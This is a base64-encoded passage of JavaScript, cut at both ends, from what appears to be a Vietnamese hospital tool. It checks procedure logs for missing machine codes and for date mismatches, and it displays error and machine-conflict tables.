ogICAgICAgICAgICBjb25zdCBtYWNoaW5lQ29kZSA9IChyb3dbbWFjaGluZUNvZGVJbmRleF0gfHwgJycpLnRvU3RyaW5nKCkudHJpbSgpOw0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlRGF0ZSA9IGRhdGVJbmRleCAhPT0gLTEgPyAocm93W2RhdGVJbmRleF0gfHwgJycpLnRvU3RyaW5nKCkudHJpbSgpIDogJyc7DQogICAgICAgICAgICBjb25zdCBzdGFydFRpbWVWYWx1ZSA9IChyb3dbc3RhcnRJbmRleF0gfHwgJycpLnRvU3RyaW5nKCkudHJpbSgpOw0KICAgICAgICAgICAgLy8gTuG6v3UgbcOjIG3DoXkgdHLhu5FuZyB0aMOsIGLDoW8gbOG7l2kNCiAgICAgICAgICAgIGlmICghbWFjaGluZUNvZGUgJiYgc3RhcnRUaW1lVmFsdWUpIHsNCiAgICAgICAgICAgICAgICBjb25zdCBzdGFydCA9IHBhcnNlRGF0ZVRpbWUocm93W3N0YXJ0SW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgIGNvbnN0IGVuZCA9IHBhcnNlRGF0ZVRpbWUocm93W2VuZEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBtaXNzaW5nTWFjaGluZUxvZy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgcm93TnVtYmVyOiByb3dOdW1iZXIsDQogICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQlwYXRpZW50SWQ6IHBhdGllbnRJZEluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50SWRJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQlwYXRpZW50QWdlOiBwYXRpZW50YWdlSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRhZ2VJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmU6IHByb2NlZHVyZU5hbWUsDQogICAgICAgICAgICAgICAgICAgIG9wZXJhdG9yOiBvcGVyYXRvckluZGV4ICE9PSAtMSA/IHJvd1tvcGVyYXRvckluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCQkJCWRvY3RvcjogZG9jdG9ySW5kZXggIT09IC0xID8gcm93W2RvY3RvckluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsIC8vIFRow6ptIGLDoWMgc+G7uQ0KICAgICAgICAgICAgICAgICAgICBkYXRlOiBwcm9jZWR1cmVEYXRlIHx8IHN0YXJ0Py5kYXRlS2V5IHx8ICdLaMO0bmcgeMOhYyDEkeG7i25oJywNCiAgICAgICAgICAgICAgICAgICAgc3RhcnRUaW1lOiBzdGFydD8uZGlzcGxheVRpbWUgfHwgJz8/JywNCiAgICAgICAgICAgICAgICAgICAgZW5kVGltZTogZW5kPy5kaXNwbGF5VGltZSB8fCAnPz8nLA0KICAgICAgICAgICAgICAgICAgICBtYWNoaW5lQ29kZTogbWFjaGluZUNvZGUNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgICAgICBjb25zb2xlLmVycm9yKGBM4buXaSBraeG7g20gdHJhIG3DoyBtw6F5IGTDsm5nICR7cm93TnVtYmVyfTpgLCBlcnJvcik7DQogICAgICAgIH0NCiAgICB9KTsNCn0NCg0KLy8gSMOgbSBraeG7g20gdHJhIHRo4budaSBnaWFuIGLhuq90IMSR4bqndSBraMOhYyBuZ8OgeSB0aOG7sWMgaGnhu4duDQpmdW5jdGlvbiBjaGVja0RhdGVNaXNtYXRjaChwcm9jZWR1cmVzLCBqc29uRGF0YSkgew0KICAgIGRhdGVNaXNtYXRjaExvZyA9IFtdOw0KICAgIA0KICAgIGNvbnN0IGhlYWRlckxpbmUxID0ganNvbkRhdGFbN10gfHwgW107DQogICAgY29uc3QgaGVhZGVyTGluZTIgPSBqc29uRGF0YVs4XSB8fCBbXTsNCiAgICBjb25zdCBjb21iaW5lZEhlYWRlcnMgPSBoZWFkZXJMaW5lMS5tYXAoKGNvbCwgaW5kZXgpID0+IA0KICAgICAgICAoY29sICsgJyAnICsgKGhlYWRlckxpbmUyW2luZGV4XSB8fCAnJykpLnRyaW0oKQ0KICAgICk7DQoNCiAgICAvLyBUw6xtIGPhu5l0IG5nw6B5IHRo4buxYyBoaeG7h24gdsOgIHRo4budaSBnaWFuIGLhuq90IMSR4bqndQ0KICAgIGNvbnN0IHByb2NlZHVyZURhdGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiANCiAgICAgICAgaC5pbmNsdWRlcygiTmfDoHkgdGjhu7FjIGhp4buHbiIpDQogICAgKTsNCiAgICBjb25zdCBzdGFydFRpbWVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiANCiAgICAgICAgaC5pbmNsdWRlcygiVGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IHRo4buxYyBoaeG7h24iKQ0KICAgICk7DQogICAgDQogICAgLy8gVMOsbSBj4buZdCBiw6FjIHPhu7kgY2jhu4kgxJHhu4tuaA0KICAgIGNvbnN0IGRvY3RvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkLDoWMgc+G7uSBjaOG7iSDEkeG7i25oIikpOw0KDQogICAgaWYgKHByb2NlZHVyZURhdGVJbmRleCA9PT0gLTEgfHwgc3RhcnRUaW1lSW5kZXggPT09IC0xKSB7DQogICAgICAgIGNvbnNvbGUubG9nKCJLaMO0bmcgdMOsbSB0aOG6pXkgY+G7mXQgTmfDoHkgdGjhu7FjIGhp4buHbiBob+G6t2MgVGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IHRo4buxYyBoaeG7h24iKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIC8vIFTDrG0gY8OhYyBj4buZdCBraMOhYyBj4bqnbiB0aGnhur90DQogICAgY29uc3QgcHJvY2VkdXJlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCIpKTsNCiAgICBjb25zdCBuYW1lSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiSOG7jSB0w6puIikpOw0KICAgIGNvbnN0IHBhdGllbnRJZEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIk3DoyBCTiIpKTsNCiAgICBjb25zdCBwYXRpZW50YWdlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVHXhu5VpIikpOw0KICAgIGNvbnN0IG9wZXJhdG9ySW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCBjaMOtbmgiKSk7DQoNCiAgICBjb25zdCByb3dzID0ganNvbkRhdGEuc2xpY2UoOSk7DQogICAgDQogICAgcm93cy5mb3JFYWNoKChyb3csIGluZGV4KSA9PiB7DQogICAgICAgIGNvbnN0IHJvd051bWJlciA9IGluZGV4ICsgMTA7DQogICAgICAgIA0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKCFyb3cgfHwgcm93Lmxlbmd0aCA9PT0gMCkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVOYW1lID0gcm93W3Byb2NlZHVyZUluZGV4XTsNCiAgICAgICAgICAgIGlmICghcHJvY2VkdXJlTmFtZSB8fCAhUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXSkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVEYXRlID0gKHJvd1twcm9jZWR1cmVEYXRlSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIGNvbnN0IHN0YXJ0VGltZVZhbHVlID0gKHJvd1tzdGFydFRpbWVJbmRleF0gfHwgJycpLnRvU3RyaW5nKCkudHJpbSgpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZURhdGUgfHwgIXN0YXJ0VGltZVZhbHVlKSByZXR1cm47DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIFBhcnNlIG5nw6B5IHRo4buxYyBoaeG7h24NCiAgICAgICAgICAgIGxldCBwcm9jZWR1cmVEYXksIHByb2NlZHVyZU1vbnRoLCBwcm9jZWR1cmVZZWFyOw0KICAgICAgICAgICAgaWYgKHByb2NlZHVyZURhdGUuaW5jbHVkZXMoJy8nKSkgew0KICAgICAgICAgICAgICAgIGNvbnN0IHBhcnRzID0gcHJvY2VkdXJlRGF0ZS5zcGxpdCgnLycpOw0KICAgICAgICAgICAgICAgIGlmIChwYXJ0cy5sZW5ndGggPT09IDMpIHsNCiAgICAgICAgICAgICAgICAgICAgW3Byb2NlZHVyZURheSwgcHJvY2VkdXJlTW9udGgsIHByb2NlZHVyZVllYXJdID0gcGFydHMubWFwKE51bWJlcik7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZURheSB8fCAhcHJvY2VkdXJlTW9udGggfHwgIXByb2NlZHVyZVllYXIpIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gUGFyc2UgdGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1DQogICAgICAgICAgICBjb25zdCBzdGFydFRpbWUgPSBwYXJzZURhdGVUaW1lKHJvd1tzdGFydFRpbWVJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICBpZiAoIXN0YXJ0VGltZSkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBTbyBzw6FuaCBuZ8OgeQ0KICAgICAgICAgICAgY29uc3QgW3N0YXJ0RGF5LCBzdGFydE1vbnRoLCBzdGFydFllYXJdID0gc3RhcnRUaW1lLmRhdGVLZXkuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gS2nhu4NtIHRyYSB4ZW0gY8OzIHBo4bqjaSBsw6AgU+G6r2MgdGh14buRYyB0aGFuZyBraMO0bmcNCiAgICAgICAgICAgIGNvbnN0IGlzSGVyYlByb2NlZHVyZSA9IHByb2NlZHVyZU5hbWUudG9Mb3dlckNhc2UoKS5pbmNsdWRlcygnc+G6r2MgdGh14buRYyB0aGFuZycpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBsZXQgaXNEYXRlTWlzbWF0Y2ggPSBmYWxzZTsNCiAgICAgICAgICAgIGxldCBlcnJvck1lc3NhZ2UgPSAnJzsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKHByb2NlZHVyZURheSAhPT0gc3RhcnREYXkgfHwgcHJvY2VkdXJlTW9udGggIT09IHN0YXJ0TW9udGggfHwgcHJvY2VkdXJlWWVhciAhPT0gc3RhcnRZZWFyKSB7DQogICAgICAgICAgICAgICAgaWYgKGlzSGVyYlByb2NlZHVyZSkgew0KICAgICAgICAgICAgICAgICAgICAvLyBW4bubaSBT4bqvYyB0aHXhu5FjIHRoYW5nOiBraeG7g20gdHJhIG7hur91IHRo4bupIDYgLT4gdGjhu6kgNywgY2jhu6cgbmjhuq10DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHByb2NEYXRlID0gbmV3IERhdGUocHJvY2VkdXJlWWVhciwgcHJvY2VkdXJlTW9udGggLSAxLCBwcm9jZWR1cmVEYXkpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBzdGFydERhdGUgPSBuZXcgRGF0ZShzdGFydFllYXIsIHN0YXJ0TW9udGggLSAxLCBzdGFydERheSk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBjb25zdCBwcm9jRGF5T2ZXZWVrID0gcHJvY0RhdGUuZ2V0RGF5KCk7IC8vIDA9Q04sIDE9VDIsIC4uLiwgNT1UNiwgNj1UNw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBzdGFydERheU9mV2VlayA9IHN0YXJ0RGF0ZS5nZXREYXkoKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIC8vIFTDrW5oIHPhu5EgbmfDoHkgY2jDqm5oIGzhu4djaA0KICAgICAgICAgICAgICAgICAgICBjb25zdCB0aW1lRGlmZiA9IHN0YXJ0RGF0ZS5nZXRUaW1lKCkgLSBwcm9jRGF0ZS5nZXRUaW1lKCk7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IGRheURpZmYgPSBNYXRoLmNlaWwodGltZURpZmYgLyAoMTAwMCAqIDM2MDAgKiAyNCkpOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgLy8gQ2jhu4kgY2jhuqVwIG5o4bqtbiBu4bq/dTogDQogICAgICAgICAgICAgICAgICAgIC8vIC0gTmfDoHkgdGjhu7FjIGhp4buHbiBsw6AgdGjhu6kgNiAoNSkgdsOgIHRo4budaSBnaWFuIGLhuq90IMSR4bqndSBsw6AgdGjhu6kgNyAoNikgaG/hurdjIGNo4bunIG5o4bqtdCAoMCkgY+G7p2EgdHXhuqduIMSRw7MNCiAgICAgICAgICAgICAgICAgICAgLy8gLSBDaMOqbmggbOG7h2NoIGtow7RuZyBxdcOhIDIgbmfDoHkNCiAgICAgICAgICAgICAgICAgICAgaWYgKHByb2NEYXlPZldlZWsgPT09IDUgJiYgKHN0YXJ0RGF5T2ZXZWVrID09PSA2IHx8IHN0YXJ0RGF5T2ZXZWVrID09PSAwKSAmJiBkYXlEaWZmIDw9IDIpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIEjhu6NwIGzhu4c6IHRo4bupIDYgLT4gdGjhu6kgNyBob+G6t2MgY2jhu6cgbmjhuq10DQogICAgICAgICAgICAgICAgICAgICAgICBpc0RhdGVNaXNtYXRjaCA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgaXNEYXRlTWlzbWF0Y2ggPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3JNZXNzYWdlID0gYFPhuq9jIHRodeG7kWMgdGhhbmc6IE5nw6B5IHRo4buxYyBoaeG7h24gKCR7cHJvY2VkdXJlRGF0ZX0pIGtow6FjIHbhu5tpIG5nw6B5IGLhuq90IMSR4bqndSAoJHtzdGFydFRpbWUuZGF0ZUtleX0pIGtow7RuZyBwaOG6o2kgeSBs4buHbmggZOG7sSB0csO5LmA7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAvLyBW4bubaSB0aOG7pyB0aHXhuq10IGtow6FjOiBsdcO0biBiw6FvIGzhu5dpDQogICAgICAgICAgICAgICAgICAgIGlzRGF0ZU1pc21hdGNoID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgZXJyb3JNZXNzYWdlID0gYE5nw6B5IHRo4buxYyBoaeG7h24gKCR7cHJvY2VkdXJlRGF0ZX0pIGtow6FjIHbhu5tpIG5nw6B5IGLhuq90IMSR4bqndSAoJHtzdGFydFRpbWUuZGF0ZUtleX0pYDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChpc0RhdGVNaXNtYXRjaCkgew0KICAgICAgICAgICAgICAgIGRhdGVNaXNtYXRjaExvZy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgcm93TnVtYmVyOiByb3dOdW1iZXIsDQogICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICBwYXRpZW50SWQ6IHBhdGllbnRJZEluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50SWRJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICBwYXRpZW50QWdlOiBwYXRpZW50YWdlSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRhZ2VJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmU6IHByb2NlZHVyZU5hbWUsDQogICAgICAgICAgICAgICAgICAgIG9wZXJhdG9yOiBvcGVyYXRvckluZGV4ICE9PSAtMSA/IHJvd1tvcGVyYXRvckluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgIGRvY3RvcjogZG9jdG9ySW5kZXggIT09IC0xID8gcm93W2RvY3RvckluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZURhdGU6IHByb2NlZHVyZURhdGUsDQogICAgICAgICAgICAgICAgICAgIHN0YXJ0VGltZTogc3RhcnRUaW1lLmRpc3BsYXlUaW1lLA0KICAgICAgICAgICAgICAgICAgICBzdGFydERhdGU6IHN0YXJ0VGltZS5kYXRlS2V5LA0KICAgICAgICAgICAgICAgICAgICBtZXNzYWdlOiBlcnJvck1lc3NhZ2UNCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoYEzhu5dpIGtp4buDbSB0cmEgZGF0ZSBtaXNtYXRjaCBkw7JuZyAke3Jvd051bWJlcn06YCwgZXJyb3IpOw0KICAgICAgICB9DQogICAgfSk7DQp9DQoNCg0KDQoNCg0KDQoNCi8vIEjDoG0gaGnhu4NuIHRo4buLIGzhu5dpIGfhuq9uIHNhaSBtw6F5DQpmdW5jdGlvbiBkaXNwbGF5TWFjaGluZUVycm9ycygpIHsNCiAgICBjb25zdCBtYWNoaW5lRXJyb3JMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUVycm9yTG9nJyk7DQogICAgY29uc3QgbWFjaGluZUVycm9yU2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lRXJyb3JTZWN0aW9uJyk7DQogICAgDQogICAgaWYgKG1hY2hpbmVFcnJvckxvZy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgbWFjaGluZUVycm9yTG9nRGl2LmlubmVySFRNTCA9ICc8cD5LaMO0bmcgY8OzIGzhu5dpIGfhuq9uIHNhaSBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICBtYWNoaW5lRXJyb3JTZWN0aW9uLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgY29uc3Qgc2hvd0RvY3RvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGRvY3RvckNvbHVtblN0eWxlID0gc2hvd0RvY3RvciA/ICcnIDogJ2Rpc3BsYXk6bm9uZSc7DQogICAgDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgICAgICA8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1taWNyb2NoaXAgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE3DoyBtw6F5PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgbWFjaGluZUVycm9yTG9nLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBodG1sICs9IGANCiAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IucGF0aWVudE5hbWV9IFs8Zm9udCBjb2xvcj0icmVkIj4ke2Vycm9yLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7ZXJyb3IucGF0aWVudElkfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgICAgIDx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij4ke2Vycm9yLmRvY3RvciB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2Vycm9yLmRhdGV9PGJyLz4ke2Vycm9yLnN0YXJ0VGltZX0g4oaSICR7ZXJyb3IuZW5kVGltZX08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IubWFjaGluZUNvZGV9PC90ZD4NCiAgICAgICAgICAgIDx0ZCBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9DQogICAgICAgICAgICA8L3RkPg0KICAgICAgICA8L3RyPmA7DQogICAgfSk7DQogICAgDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgDQogICAgbWFjaGluZUVycm9yTG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQogICAgbWFjaGluZUVycm9yU2VjdGlvbi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICANCiAgICAvLyBD4bqtcCBuaOG6rXQgZHJvcGRvd24gbOG7jWMNCiAgICB1cGRhdGVNYWNoaW5lT3BlcmF0b3JGaWx0ZXIoKTsNCn0NCg0KLy8gSMOgbSBoaeG7g24gdGjhu4sgeHVuZyDEkeG7mXQgbcOheQ0KZnVuY3Rpb24gZGlzcGxheU1hY2hpbmVDb25mbGljdHMoKSB7DQogICAgY29uc3QgbWFjaGluZUNvbmZsaWN0TG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVDb25mbGljdExvZycpOw0KICAgIGNvbnN0IG1hY2hpbmVDb25mbGljdFNlY3Rpb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUNvbmZsaWN0U2VjdGlvbicpOw0KICAgIA0KICAgIGlmIChtYWNoaW5lQ29uZmxpY3RMb2cubGVuZ3RoID09PSAwKSB7DQogICAgICAgIG1hY2hpbmVDb25mbGljdExvZ0Rpdi5pbm5lckhUTUwgPSAnPHA+S2jDtG5nIGPDsyB4dW5nIMSR4buZdCBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICBtYWNoaW5lQ29uZmxpY3RTZWN0aW9uLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgICAgY29uc3Qgc2hvd0RvY3RvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGRvY3RvckNvbHVtblN0eWxlID0gc2hvd0RvY3RvciA/ICcnIDogJ2Rpc3BsYXk6bm9uZSc7DQogIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtbWljcm9jaGlwIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBNw6F5PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KCQkJCTx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCgkJCQk8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gR+G7o2kgw70gZ2nhu508L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgbWFjaGluZUNvbmZsaWN0TG9nLmZvckVhY2goY29uZmxpY3QgPT4gew0KICAgICAgICANCgkJLy9UaMOqbSBkw7JuZyB0aMO0bmcgdGluIHbhu4EgbcOheSB2w6AgbmfDoHkgeHVuZyDEkeG7mXQgY2jGsGEgbOG7jWMNCiAgICAgICAvLyBodG1sICs9IGANCiAgICAgLy8gPHRyIGNsYXNzPSJlcnJvci1yb3ciIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmM2NkOyI+DQogICAgICAvLyAgICAgPHRkIGNvbHNwYW49IjUiIHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7IGZvbnQtd2VpZ2h0OiBib2xkOyBjb2xvcjogIzg1NjQwNDsiPg0KICAgICAgIC8vICAgICAgIDxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUiPjwvaT4gDQogICAgICAgLy8gICAgICBYVU5HIMSQ4buYVCBNw4FZOiAke2NvbmZsaWN0Lm1hY2hpbmVDb2RlfSAtIE5Hw4BZOiAke2NvbmZsaWN0LmRhdGV9DQogICAgIC8vICAgICAgIDwvdGQ+DQogICAgIC8vLyAgIDwvdHI+YDsNCiAgICAgICANCiAgICAgICAgY29uZmxpY3QuY29uZmxpY3RQcm9jZWR1cmVzLmZvckVhY2goKHByb2MsIGluZGV4KSA9PiB7DQogICAgICAgICAgICBodG1sICs9IGANCiAgICAgICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICAke2luZGV4ID09PSAwID8gYDx0ZCByb3dzcGFuPSIke2NvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlcy5sZW5ndGh9Ij4ke2NvbmZsaWN0Lm1hY2hpbmV